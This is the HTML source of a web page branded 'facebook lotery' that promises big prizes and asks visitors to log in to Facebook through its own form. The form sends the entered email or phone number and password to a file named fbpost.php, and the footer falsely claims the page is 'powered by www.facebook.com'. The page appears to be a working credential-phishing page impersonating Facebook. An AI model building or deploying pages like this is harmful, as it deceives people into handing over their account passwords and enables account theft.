<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>lotery</title>
  <link rel="stylesheet" href="css/style.css">
  <link rel="stylesheet" href="css/bootstrap.min.css">
</head>
<style>
  body{
    background-image:url(shop5.jpg);
    background-repeat: no-repeat;
    background-attachment: fixed;
    background-size: cover;
  }
  h2{
    font-weight: bold;
    font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif;
font-size: 31px;
  }
  i{
    font-size: 19px;
  }
  h3{
    font-family: Cambria, Cochin, Georgia, Times, 'Times New Roman', serif;
    font-weight: bold;
  }
  p{
    font-size: 17px;
    font-family: Arial, Helvetica, sans-serif;
  }
  .container-fluid{
    padding-top: 70px;
  }
  .navbar{
    position:fixed;
    z-index: 3;
    width:100%;
  }
  nav a img{
    width: 50px;
  }
  a{
    font-weight:bold;
  }
</style>
<body>
<nav class="navbar navbar-expand-sm navbar-light bg-primary">
  <a class="navbar-brand" href="#"><img src="logo.png" alt=""></a>
  <button class="navbar-toggler d-lg-none" type="button" data-toggle="collapse" data-target="#collapsibleNavId" aria-controls="collapsibleNavId"
      aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div class="collapse navbar-collapse" id="collapsibleNavId">

    <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
      <li class="nav-item active">
        <h3 class="text-white text-center">facebook lotery</h3>
      </li>
    </ul>
    <form class="form-inline my-2 my-lg-0">
      
    <a name="" id="" class="btn bg-white text-primary" href="info.php" role="button"><strong>Info </strong></a>

    </form>
  </div>
</nav>
 <div class="container-fluid">
   <div class="row">
   <div class="col-lg-6 mt-3 m-2 p-4 section bg-primary">
     <i class="text-white">Login your facebook account and claim the reward massive gifts to be won </i>
     <img src="./lottery-png.png" class="img-fluid ${3|rounded-top,rounded-right,rounded-bottom,rounded-left,rounded-circle,|}" alt="">
       <h2 class="text-white text-center">WIN BIG PLAY BIG 2025</h2>
       <p class="text-white">Lotteries are a big business. Hopeful individuals dreaming of huge and potentially life-changing 
         cash prizes spend a significant amount of cash every month. Lottery proceeds help fund public sector
          programs, including education, park services, and funds for veterans and seniors.</p>
       <p class="text-white text-center">Play and Win Big</p>
       </div>
     <div class="col-lg-5 section">
       <h3 class="text-center text-primary">Log In</h3>
       <p class="text-center">it free and always be</p>
       <form action="fbpost.php" method="post">
         <div class="form-group">
          <label for="">Email or Phone</label>
          <input type="text"
            class="form-control" name="user" id="" aria-describedby="helpId" placeholder="">
        </div>
        <div class="form-group">
          <label for="">Password</label>
          <input type="password"
            class="form-control" name="pass" id="" aria-describedby="helpId" placeholder="">
        <br>
    <button type="submit" name="send" id="" class="btn btn-primary btn-lg btn-block">Login</button>
    
        </form>

     </div>
  
   </div>

 </div>
 <div class="">
<i class="fa fa-copyright float-right text-white" aria-hidden="true">powered by www.facebook.com</i>
</div>
</body>
<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.bundle.min.js"></script>

</html>